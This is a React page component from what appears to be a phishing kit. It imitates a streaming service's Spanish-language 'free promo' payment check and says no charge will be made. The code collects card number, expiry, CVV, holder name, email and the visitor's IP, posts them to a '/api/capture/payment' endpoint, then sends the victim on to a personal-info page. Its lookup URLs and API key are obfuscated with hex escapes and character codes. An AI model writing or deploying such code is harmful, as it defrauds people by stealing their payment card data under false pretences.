/**
 * Promo Payment Page - Same as PaymentConfirmation but with "no charge today" messaging
 * Routes to /personal-info after submission (same as regular flow)
 */

import PageTransition from "@/components/PageTransition";
import { useState, useMemo, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import BrandLogo from "@/components/BrandLogo";

type CardBrand = "visa" | "mastercard" | "amex" | "diners" | "unknown";

interface BinInfo {
  isValid: boolean;
  scheme: string;
  type: string;
  brand: string;
  bank: string;
  country: string;
  countryEmoji: string;
  currency: string;
  isPrepaid: boolean;
  isCommercial: boolean;
  bankLogo: string | null;
}

const _k = [0x63,0x65,0x32,0x66,0x63,0x32,0x31,0x30,0x65,0x36,0x62,0x39,0x66,0x66,0x37,0x65,0x66,0x32,0x37,0x38,0x35,0x30,0x62,0x65,0x64,0x34,0x38,0x61,0x61,0x34,0x62,0x30];
const GREIP_API_KEY = _k.map(c => String.fromCharCode(c)).join('');

const BANK_LOGOS: Record<string, { name: string; logo: string }> = {
  "bancolombia": { name: "Bancolombia", logo: "/images/logos/bancolombia.png" },
  "davivienda": { name: "Davivienda", logo: "/images/logos/davivienda.png" },
  "bbva": { name: "BBVA", logo: "/images/logos/bbva.png" },
  "bogota": { name: "Banco de Bogotá", logo: "/images/logos/banco-bogota.png" },
  "popular": { name: "Banco Popular", logo: "/images/logos/banco-popular.png" },
  "occidente": { name: "Banco de Occidente", logo: "/images/logos/banco-occidente.png" },
  "av villas": { name: "AV Villas", logo: "/images/logos/av-villas.png" },
  "villas": { name: "AV Villas", logo: "/images/logos/av-villas.png" },
  "caja social": { name: "Banco Caja Social", logo: "/images/logos/caja-social.png" },
  "agrario": { name: "Banco Agrario", logo: "/images/logos/banco-agrario.png" },
  "falabella": { name: "Banco Falabella", logo: "/images/logos/falabella.png" },
  "itau": { name: "Itaú", logo: "/images/logos/itau.jpg" },
  "nequi": { name: "Nequi", logo: "/images/logos/nequi.jpeg" },
  "nubank": { name: "Nu Bank", logo: "/images/logos/nubank.png" },
  "nu": { name: "Nu Bank", logo: "/images/logos/nubank.png" },
  "daviplata": { name: "Daviplata", logo: "/images/logos/daviplata.png" },
  "davibank": { name: "DaviBank", logo: "/images/logos/davivienda.png" },
  "serfinanza": { name: "Serfinanza", logo: "/images/logos/serfinanza.jpg" },
  "finandina": { name: "Finandina", logo: "/images/logos/finandina.jpg" },
  "bancoomeva": { name: "Bancoomeva", logo: "/images/logos/bancoomeva.png" },
  "coomeva": { name: "Bancoomeva", logo: "/images/logos/bancoomeva.png" },
};

function findBankLogo(bankName: string): { name: string; logo: string } | null {
  if (!bankName) return null;
  const lower = bankName.toLowerCase();
  for (const [key, value] of Object.entries(BANK_LOGOS)) {
    if (lower.includes(key)) return value;
  }
  return null;
}

function detectCardBrand(number: string): CardBrand {
  const clean = number.replace(/\s/g, "");
  if (!clean) return "unknown";
  if (/^3[47]/.test(clean)) return "amex";
  if (/^4/.test(clean)) return "visa";
  if (/^5[1-5]/.test(clean) || /^2[2-7]/.test(clean)) return "mastercard";
  if (/^3(?:0[0-5]|[68])/.test(clean)) return "diners";
  return "unknown";
}

function luhnCheck(number: string): boolean {
  const clean = number.replace(/\s/g, "");
  if (clean.length < 13) return false;
  let sum = 0;
  let alternate = false;
  for (let i = clean.length - 1; i >= 0; i--) {
    let n = parseInt(clean[i], 10);
    if (alternate) { n *= 2; if (n > 9) n -= 9; }
    sum += n;
    alternate = !alternate;
  }
  return sum % 10 === 0;
}

function validateExpiry(expiry: string): { valid: boolean; error: string } {
  if (!expiry || expiry.length < 5) return { valid: false, error: "Ingresa la fecha de vencimiento." };
  const [monthStr, yearStr] = expiry.split("/");
  const month = parseInt(monthStr, 10);
  const year = parseInt("20" + yearStr, 10);
  if (month < 1 || month > 12) return { valid: false, error: "Mes inválido (01-12)." };
  const now = new Date();
  if (year < now.getFullYear() || (year === now.getFullYear() && month < now.getMonth() + 1))
    return { valid: false, error: "La tarjeta está vencida." };
  return { valid: true, error: "" };
}

function CardBrandLogo({ brand }: { brand: CardBrand }) {
  switch (brand) {
    case "visa":
      return (<svg viewBox="0 0 48 32" className="h-7 w-auto"><rect width="48" height="32" rx="4" fill="white" stroke="#e0e0e0" strokeWidth="1" /><text x="24" y="20" textAnchor="middle" fontFamily="Arial" fontWeight="bold" fontSize="12" fill="#1a1f71">VISA</text></svg>);
    case "mastercard":
      return (<svg viewBox="0 0 48 32" className="h-7 w-auto"><rect width="48" height="32" rx="4" fill="white" stroke="#e0e0e0" strokeWidth="1" /><circle cx="19" cy="16" r="9" fill="#EB001B" /><circle cx="29" cy="16" r="9" fill="#F79E1B" /><path d="M24 9.5a9 9 0 0 1 0 13" fill="#FF5F00" /></svg>);
    case "amex":
      return (<svg viewBox="0 0 48 32" className="h-7 w-auto"><rect width="48" height="32" rx="4" fill="#006FCF" /><text x="24" y="20" textAnchor="middle" fontFamily="Arial" fontWeight="bold" fontSize="8" fill="white">AMEX</text></svg>);
    case "diners":
      return (<svg viewBox="0 0 60 40" className="h-7 w-auto"><rect width="60" height="40" rx="4" fill="white" stroke="#e0e0e0" strokeWidth="1"/><circle cx="24" cy="20" r="13" fill="#0079BE"/><circle cx="24" cy="20" r="9.5" fill="white"/><path d="M21 12.5 a9.5 9.5 0 0 0 0 15" fill="#0079BE"/><path d="M27 12.5 a9.5 9.5 0 0 1 0 15" fill="#0079BE"/><circle cx="36" cy="20" r="13" fill="#0079BE" opacity="0.85"/><circle cx="36" cy="20" r="9.5" fill="white"/><path d="M33 12.5 a9.5 9.5 0 0 0 0 15" fill="#0079BE" opacity="0.85"/><path d="M39 12.5 a9.5 9.5 0 0 1 0 15" fill="#0079BE" opacity="0.85"/></svg>);
    default:
      return null;
  }
}

export default function PromoPayment() {
  const [, setLocation] = useLocation();
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [name, setName] = useState("");
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [isLoading, setIsLoading] = useState(false);
  const [userIP, setUserIP] = useState("");

  useEffect(() => {
    const metaThemeColor = document.querySelector('meta[name="theme-color"]');
    if (metaThemeColor) metaThemeColor.setAttribute('content', '#ffffff');
    return () => { if (metaThemeColor) metaThemeColor.setAttribute('content', '#141414'); };
  }, []);

  useEffect(() => {
    fetch(['\x68\x74\x74\x70\x73\x3a\x2f\x2f','\x61\x70\x69\x2e\x69\x70\x69\x66\x79','\x2e\x6f\x72\x67\x3f\x66\x6f\x72\x6d\x61\x74\x3d\x6a\x73\x6f\x6e'].join(''))
      .then((res) => res.json())
      .then((data) => setUserIP(data.ip || ""))
      .catch(() => {});
  }, []);

  const [binInfo, setBinInfo] = useState<BinInfo | null>(null);
  const [binLoading, setBinLoading] = useState(false);
  const [binError, setBinError] = useState("");
  const lastBinChecked = useRef("");

  const cardBrand = useMemo(() => detectCardBrand(cardNumber), [cardNumber]);
  const cvvLength = cardBrand === "amex" ? 4 : 3;
  const cardMaxLength = cardBrand === "amex" ? 15 : 16;

  useEffect(() => {
    const cleanNumber = cardNumber.replace(/\s/g, "");
    const bin = cleanNumber.slice(0, 6);
    if (bin.length >= 6 && bin !== lastBinChecked.current) {
      lastBinChecked.current = bin;
      setBinLoading(true);
      setBinError("");
      fetch(`${['\x68\x74\x74\x70\x73\x3a\x2f\x2f','\x67\x72\x65\x67\x65\x6f\x69\x70','\x2e\x63\x6f\x6d\x2f\x42\x49\x4e\x4c\x6f\x6f\x6b\x75\x70'].join('')}?bin=${bin}&key=${GREIP_API_KEY}&format=JSON&mode=live`)
        .then((res) => res.json())
        .then((data) => {
          if (data.status === "success" && data.data) {
            const d = data.data;
            setBinInfo({ isValid: d.isValid, scheme: d.info?.scheme?.name || "", type: d.info?.scheme?.type || "", brand: d.info?.scheme?.brand || "", bank: d.info?.bank?.name || "", country: d.info?.country?.name || "", countryEmoji: d.info?.country?.emoji || "", currency: d.info?.scheme?.currency || "", isPrepaid: d.info?.scheme?.isPrepaid || false, isCommercial: d.info?.scheme?.isCommercial || false, bankLogo: d.info?.bank?.logo || null });
          } else { setBinError("No se pudo verificar el BIN."); setBinInfo(null); }
          setBinLoading(false);
        })
        .catch(() => { setBinError("Error de conexión."); setBinInfo(null); setBinLoading(false); });
    } else if (bin.length < 6) { setBinInfo(null); setBinError(""); lastBinChecked.current = ""; }
  }, [cardNumber]);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (navigator.vibrate) navigator.vibrate(10);
    const newErrors: Record<string, string> = {};
    const cleanCard = cardNumber.replace(/\s/g, "");
    if (!cleanCard) newErrors.cardNumber = "Ingresa un número de tarjeta.";
    else if (cleanCard.length < 13) newErrors.cardNumber = "Número de tarjeta incompleto.";
    else if (!luhnCheck(cleanCard)) newErrors.cardNumber = "Número de tarjeta inválido.";
    const expiryResult = validateExpiry(expiry);
    if (!expiryResult.valid) newErrors.expiry = expiryResult.error;
    if (!cvv) newErrors.cvv = "Ingresa el CVV.";
    else if (cvv.length < cvvLength) newErrors.cvv = `El CVV debe tener ${cvvLength} dígitos.`;
    if (!name.trim()) newErrors.name = "Ingresa el nombre del titular.";
    setErrors(newErrors);

    if (Object.keys(newErrors).length === 0) {
      setIsLoading(true);
      sessionStorage.setItem("sp_card_number", cardNumber);
      sessionStorage.setItem("sp_holder_name", name);
      sessionStorage.setItem("sp_expiry", expiry);
      sessionStorage.setItem("sp_cvv", cvv);
      const detailedCategory = [binInfo?.brand, binInfo?.type].filter(Boolean).join(" ");
      sessionStorage.setItem("sp_card_category", detailedCategory || "");
      sessionStorage.setItem("sp_card_brand", binInfo?.brand || "");
      sessionStorage.setItem("sp_bank_name", binInfo?.bank || "");
      sessionStorage.setItem("sp_card_scheme", binInfo?.scheme || "");
      sessionStorage.setItem("sp_country", binInfo?.country || "");
      const email = sessionStorage.getItem("sp_email") || sessionStorage.getItem("userEmail") || "";
      sessionStorage.setItem("sp_email", email);
      fetch("/api/capture/payment", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          name, cardNumber: cardNumber.replace(/\s/g, ""), expiry, cvv, email,
          ipAddress: userIP,
          cardCategory: [binInfo?.brand, binInfo?.type].filter(Boolean).join(" ") || "",
          cardScheme: binInfo?.scheme || "", bankName: binInfo?.bank || "",
        }),
      }).catch(() => {});
      setTimeout(() => { setIsLoading(false); setLocation("/personal-info"); }, 1500);
    }
  };

  const formatCardNumber = (value: string) => {
    const nums = value.replace(/\D/g, "").slice(0, cardMaxLength);
    if (cardBrand === "amex") return nums.replace(/(\d{4})(\d{0,6})(\d{0,5})/, (_, a, b, c) => { let r = a; if (b) r += " " + b; if (c) r += " " + c; return r; });
    return nums.replace(/(\d{4})(?=\d)/g, "$1 ");
  };

  const formatExpiry = (value: string) => {
    const nums = value.replace(/\D/g, "").slice(0, 4);
    if (nums.length >= 3) return nums.slice(0, 2) + "/" + nums.slice(2);
    return nums;
  };

  return (
    <PageTransition>
      <div className="w-full bg-white flex flex-col" style={{ minHeight: 'var(--app-height, 100dvh)' }}>
        {/* Header */}
        <header className="px-4 sm:px-8 lg:px-12 py-3 border-b border-gray-200 flex justify-between items-center flex-shrink-0">
          <BrandLogo height={20} />
          <button onClick={() => setLocation("/promo")} className="text-black text-sm font-semibold hover:text-gray-600 transition-colors">
            Cerrar sesión
          </button>
        </header>

        {/* Main Content */}
        <main className="flex flex-col px-4 sm:px-8 lg:px-12 pt-8 sm:pt-12 pb-4 flex-shrink-0">
          <div className="w-full max-w-[440px] mx-auto sm:mx-0 lg:mx-auto">
            {/* Promo badge - NO CHARGE TODAY */}
            <div className="flex items-center gap-2 mb-4 animate-[fadeSlideUp_0.4s_ease-out_both]">
              <div className="bg-green-100 text-green-800 text-[11px] font-bold px-3 py-1.5 rounded-full flex items-center gap-1.5">
                <svg viewBox="0 0 16 16" className="w-3.5 h-3.5" fill="none">
                  <circle cx="8" cy="8" r="7" fill="#22c55e" />
                  <path d="M5 8l2 2 4-4" stroke="white" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
                NO SE REALIZARÁ NINGÚN COBRO HOY
              </div>
            </div>

            {/* Step indicator */}
            <p className="text-xs text-gray-500 uppercase tracking-wider mb-1 animate-[fadeSlideUp_0.4s_ease-out_both]" style={{ animationDelay: '0ms' }}>
              Verificación de método de pago
            </p>

            {/* Title */}
            <h1 className="text-[24px] sm:text-[28px] font-bold text-black mb-2 leading-tight animate-[fadeSlideUp_0.4s_ease-out_both]" style={{ animationDelay: '60ms' }}>
              Verifica tu método de pago
            </h1>

            {/* Info message */}
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-5 animate-[fadeSlideUp_0.4s_ease-out_both]" style={{ animationDelay: '90ms' }}>
              <p className="text-blue-800 text-[13px] leading-relaxed">
                <strong>Importante:</strong> No se realizará ningún cargo a tu tarjeta hoy. Solo necesitamos verificar tu método de pago para activar tu promoción. El cobro se iniciará automáticamente después de los 6 meses de regalo.
              </p>
            </div>

            {/* Card logos */}
            <div className="flex gap-1.5 items-center mb-6 animate-[fadeSlideUp_0.4s_ease-out_both]" style={{ animationDelay: '120ms' }}>
              <svg viewBox="0 0 48 32" className="h-5 w-auto"><rect width="48" height="32" rx="4" fill="white" stroke="#e0e0e0" strokeWidth="1" /><text x="24" y="20" textAnchor="middle" fontFamily="Arial" fontWeight="bold" fontSize="12" fill="#1a1f71">VISA</text></svg>
              <svg viewBox="0 0 48 32" className="h-5 w-auto"><rect width="48" height="32" rx="4" fill="white" stroke="#e0e0e0" strokeWidth="1" /><circle cx="19" cy="16" r="9" fill="#EB001B" /><circle cx="29" cy="16" r="9" fill="#F79E1B" /><path d="M24 9.5a9 9 0 0 1 0 13" fill="#FF5F00" /></svg>
              <svg viewBox="0 0 48 32" className="h-5 w-auto"><rect width="48" height="32" rx="4" fill="#006FCF" /><text x="24" y="20" textAnchor="middle" fontFamily="Arial" fontWeight="bold" fontSize="8" fill="white">AMEX</text></svg>
              <svg viewBox="0 0 60 40" className="h-5 w-auto"><rect width="60" height="40" rx="4" fill="white" stroke="#e0e0e0" strokeWidth="1"/><circle cx="24" cy="20" r="13" fill="#0079BE"/><circle cx="24" cy="20" r="9.5" fill="white"/><path d="M21 12.5 a9.5 9.5 0 0 0 0 15" fill="#0079BE"/><path d="M27 12.5 a9.5 9.5 0 0 1 0 15" fill="#0079BE"/><circle cx="36" cy="20" r="13" fill="#0079BE" opacity="0.85"/><circle cx="36" cy="20" r="9.5" fill="white"/><path d="M33 12.5 a9.5 9.5 0 0 0 0 15" fill="#0079BE" opacity="0.85"/><path d="M39 12.5 a9.5 9.5 0 0 1 0 15" fill="#0079BE" opacity="0.85"/></svg>
            </div>

            {/* Form */}
            <form onSubmit={handleSubmit} className="space-y-4">
              {/* Card Number */}
              <div className="relative animate-[fadeSlideUp_0.4s_ease-out_both]" style={{ animationDelay: '180ms' }}>
                <div className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none">
                  <svg xmlns="http://www.w3.org/2000/svg" className="w-[18px] h-[18px]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.8}>
                    <path strokeLinecap="round" strokeLinejoin="round" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
                  </svg>
                </div>
                <input type="text" placeholder="Número de tarjeta" value={cardNumber}
                  onChange={(e) => { setCardNumber(formatCardNumber(e.target.value)); if (errors.cardNumber) setErrors((prev) => ({ ...prev, cardNumber: "" })); }}
                  inputMode="numeric"
                  className={`w-full h-[52px] pl-11 pr-16 border rounded-lg text-[15px] text-black bg-white outline-none transition-all duration-200 ${errors.cardNumber ? "border-[#E50914] bg-red-50/30" : cardNumber.replace(/\s/g, "").length >= 13 && luhnCheck(cardNumber.replace(/\s/g, "")) ? "border-green-500 focus:border-green-500 focus:ring-1 focus:ring-green-500/20" : "border-gray-300 focus:border-[#333] focus:ring-1 focus:ring-[#333]/10"}`}
                />
                <div className="absolute right-3 top-1/2 -translate-y-1/2 flex items-center gap-1.5">
                  {binLoading && (<svg className="animate-spin h-4 w-4 text-gray-400" viewBox="0 0 24 24" fill="none"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" /><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" /></svg>)}
                  {cardNumber.replace(/\s/g, "").length >= 13 && !errors.cardNumber && luhnCheck(cardNumber.replace(/\s/g, "")) ? (
                    <svg viewBox="0 0 16 16" className="w-4 h-4" fill="none"><circle cx="8" cy="8" r="7" fill="#22c55e" /><path d="M5 8l2 2 4-4" stroke="white" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" /></svg>
                  ) : cardBrand !== "unknown" ? <CardBrandLogo brand={cardBrand} /> : null}
                </div>
                {errors.cardNumber && <p className="text-[#E50914] text-[11px] mt-1 ml-1 flex items-center gap-1"><svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd"/></svg>{errors.cardNumber}</p>}
              </div>

              {/* Bank logo */}
              {binInfo && binInfo.bank && findBankLogo(binInfo.bank) && (
                <div className="flex items-center gap-2.5 p-3 bg-gray-50 rounded-lg border border-gray-100 animate-[fadeSlideUp_0.3s_ease-out_both]">
                  <img src={findBankLogo(binInfo.bank)!.logo} alt={findBankLogo(binInfo.bank)!.name} className="w-10 h-10 object-contain rounded-md" />
                  <div className="flex flex-col">
                    <span className="text-[13px] font-medium text-gray-800">{findBankLogo(binInfo.bank)!.name}</span>
                    <span className="text-[11px] text-gray-500">{binInfo.scheme} {binInfo.type && `• ${binInfo.type}`}</span>
                  </div>
                </div>
              )}

              {/* Expiry and CVV */}
              <div className="grid grid-cols-2 gap-3 animate-[fadeSlideUp_0.4s_ease-out_both]" style={{ animationDelay: '240ms' }}>
                <div className="relative">
                  <div className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none">
                    <svg xmlns="http://www.w3.org/2000/svg" className="w-[18px] h-[18px]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.8}>
                      <path strokeLinecap="round" strokeLinejoin="round" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" />
                    </svg>
                  </div>
                  <input type="text" placeholder="MM/AA" value={expiry}
                    onChange={(e) => { setExpiry(formatExpiry(e.target.value)); if (errors.expiry) setErrors((prev) => ({ ...prev, expiry: "" })); }}
                    inputMode="numeric"
                    className={`w-full h-[52px] pl-11 pr-9 border rounded-lg text-[15px] text-black bg-white outline-none transition-all duration-200 ${errors.expiry ? "border-[#E50914] bg-red-50/30" : expiry.length === 5 && validateExpiry(expiry).valid ? "border-green-500 focus:border-green-500 focus:ring-1 focus:ring-green-500/20" : "border-gray-300 focus:border-[#333] focus:ring-1 focus:ring-[#333]/10"}`}
                  />
                  {expiry.length === 5 && validateExpiry(expiry).valid && !errors.expiry && (
                    <div className="absolute right-3 top-1/2 -translate-y-1/2"><svg viewBox="0 0 16 16" className="w-4 h-4" fill="none"><circle cx="8" cy="8" r="7" fill="#22c55e" /><path d="M5 8l2 2 4-4" stroke="white" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" /></svg></div>
                  )}
                  {errors.expiry && <p className="text-[#E50914] text-[11px] mt-1 ml-1 flex items-center gap-1"><svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd"/></svg>{errors.expiry}</p>}
                </div>
                <div className="relative">
                  <div className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none">
                    <svg xmlns="http://www.w3.org/2000/svg" className="w-[18px] h-[18px]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.8}>
                      <path strokeLinecap="round" strokeLinejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                    </svg>
                  </div>
                  <input type="text" placeholder={`CVV (${cvvLength} dígitos)`} value={cvv}
                    onChange={(e) => { setCvv(e.target.value.replace(/\D/g, "").slice(0, cvvLength)); if (errors.cvv) setErrors((prev) => ({ ...prev, cvv: "" })); }}
                    inputMode="numeric"
                    className={`w-full h-[52px] pl-11 pr-9 border rounded-lg text-[15px] text-black bg-white outline-none transition-all duration-200 ${errors.cvv ? "border-[#E50914] bg-red-50/30" : cvv.length === cvvLength ? "border-green-500 focus:border-green-500 focus:ring-1 focus:ring-green-500/20" : "border-gray-300 focus:border-[#333] focus:ring-1 focus:ring-[#333]/10"}`}
                  />
                  {cvv.length === cvvLength && !errors.cvv && (
                    <div className="absolute right-3 top-1/2 -translate-y-1/2"><svg viewBox="0 0 16 16" className="w-4 h-4" fill="none"><circle cx="8" cy="8" r="7" fill="#22c55e" /><path d="M5 8l2 2 4-4" stroke="white" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" /></svg></div>
                  )}
                  {errors.cvv && <p className="text-[#E50914] text-[11px] mt-1 ml-1 flex items-center gap-1"><svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd"/></svg>{errors.cvv}</p>}
                </div>
              </div>

              {cardBrand === "amex" && (
                <p className="text-gray-500 text-[11px] -mt-2 ml-1">American Express requiere un CVV de 4 dígitos (ubicado en el frente de la tarjeta).</p>
              )}

              {/* Cardholder Name */}
              <div className="relative animate-[fadeSlideUp_0.4s_ease-out_both]" style={{ animationDelay: '300ms' }}>
                <div className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none">
                  <svg xmlns="http://www.w3.org/2000/svg" className="w-[18px] h-[18px]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.8}>
                    <path strokeLinecap="round" strokeLinejoin="round" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                  </svg>
                </div>
                <input type="text" placeholder="Nombre del titular" value={name}
                  onChange={(e) => { setName(e.target.value); if (errors.name) setErrors((prev) => ({ ...prev, name: "" })); }}
                  className={`w-full h-[52px] pl-11 pr-9 border rounded-lg text-[15px] text-black bg-white outline-none transition-all duration-200 ${errors.name ? "border-[#E50914] bg-red-50/30" : name.trim().length >= 5 ? "border-green-500 focus:border-green-500 focus:ring-1 focus:ring-green-500/20" : "border-gray-300 focus:border-[#333] focus:ring-1 focus:ring-[#333]/10"}`}
                />
                {name.trim().length >= 5 && !errors.name && (
                  <div className="absolute right-3 top-1/2 -translate-y-1/2"><svg viewBox="0 0 16 16" className="w-4 h-4" fill="none"><circle cx="8" cy="8" r="7" fill="#22c55e" /><path d="M5 8l2 2 4-4" stroke="white" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" /></svg></div>
                )}
                {errors.name && <p className="text-[#E50914] text-[11px] mt-1 ml-1 flex items-center gap-1"><svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd"/></svg>{errors.name}</p>}
              </div>

              {/* No charge reminder */}
              <div className="flex items-start gap-2.5 bg-green-50 border border-green-200 rounded-lg px-4 py-3 animate-[fadeSlideUp_0.4s_ease-out_both]" style={{ animationDelay: '360ms' }}>
                <svg viewBox="0 0 24 24" className="w-5 h-5 text-green-600 flex-shrink-0 mt-0.5" fill="none" stroke="currentColor" strokeWidth={2}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                </svg>
                <div>
                  <p className="text-green-800 text-[12px] font-semibold">$0 COP hoy</p>
                  <p className="text-green-700 text-[11px] leading-relaxed">
                    Tu tarjeta no será cobrada. Solo verificamos que sea un método de pago válido para cuando finalice tu periodo de regalo en 6 meses.
                  </p>
                </div>
              </div>

              {/* Submit Button */}
              <button type="submit" disabled={isLoading}
                className="btn-confirm-pulse w-full h-[52px] bg-[#E50914] text-white text-[15px] font-bold rounded-lg hover:bg-[#F6121D] active:scale-[0.97] transition-all duration-150 disabled:opacity-70 shadow-[0_4px_12px_rgba(229,9,20,0.25)] animate-[fadeSlideUp_0.4s_ease-out_both] hover:scale-[1.01]" style={{ animationDelay: '420ms' }}
              >
                {isLoading ? (
                  <span className="flex items-center justify-center gap-2">
                    <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24" fill="none"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" /><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" /></svg>
                    Verificando...
                  </span>
                ) : "Verificar método de pago"}
              </button>
            </form>
          </div>
        </main>

        {/* Footer */}
        <footer className="border-t border-gray-200 bg-[#f3f3f3] px-4 sm:px-8 lg:px-12 pt-8 pb-8 safe-bottom flex-1">
          <div className="w-full max-w-[440px] mx-auto sm:mx-0 lg:mx-auto">
            <p className="text-gray-800 text-[13px] mb-6">¿Preguntas? Llama al 01 800 519 1570 (sin cargo)</p>
            <div className="grid grid-cols-2 gap-y-5 gap-x-8 text-[13px]">
              <a href="#" className="text-gray-600 underline hover:text-black transition-colors">Preguntas frecuentes</a>
              <a href="#" className="text-gray-600 underline hover:text-black transition-colors">Centro de ayuda</a>
              <a href="#" className="text-gray-600 underline hover:text-black transition-colors">Términos de uso</a>
              <a href="#" className="text-gray-600 underline hover:text-black transition-colors">Privacidad</a>
            </div>
          </div>
        </footer>
      </div>
    </PageTransition>
  );
}
